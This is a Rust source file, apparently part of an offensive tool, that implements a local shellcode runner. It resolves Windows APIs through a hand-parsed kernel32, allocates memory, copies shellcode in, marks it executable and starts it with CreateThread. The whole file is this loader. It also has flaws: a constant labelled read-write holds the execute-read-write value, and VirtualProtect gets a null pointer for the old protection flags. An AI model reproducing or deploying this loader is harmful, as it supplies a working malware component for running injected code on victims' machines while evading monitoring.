use std::error::Error;
use std::ptr::copy;
use core::ffi::c_void;
use crate::util::kernel32::{Kernel32};
use crate::util::pe_headers::PeHeader;

const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PROTECTION_FLAG_READ_WRITE: u32 = 0x40;
const PROTECTION_FLAG_EXECUTE: u32 = 0x10;

// This means infinity I guess, we should probably have defines somewhere else though tbh
const INFINITE: u32 = 4294967295u32;


pub unsafe fn execute_local_thread(pe_header:PeHeader, shellcode: Vec<u8>) -> Result<isize, Box<dyn Error>> {
    let shellcode_size = shellcode.len();

    let kernel32 = Kernel32::parse(pe_header);

    let mem_pointer = kernel32.VirtualAlloc(None, shellcode_size, MEM_COMMIT_RESERVE, PROTECTION_FLAG_READ_WRITE);

    copy(
        shellcode.as_slice().as_ptr(),
        mem_pointer.cast(),
        shellcode_size,
    );

    let protection_flags = PROTECTION_FLAG_EXECUTE;
   
    // TODO \/ This doesn't ever actually update to the old protection flags, we may have to move
    // this functionality to the reimplemented virtualprotect function in kernel32.rs.
    let mut old_protection_flags = 0 as *mut u32;
    kernel32.VirtualProtect(mem_pointer as *const c_void, shellcode_size, protection_flags, old_protection_flags);

    let thread_handle = kernel32.CreateThread(None, 0, mem_pointer, None, 0, None);


    kernel32.WaitForSingleObject(thread_handle, INFINITE);
    Ok(thread_handle)

}
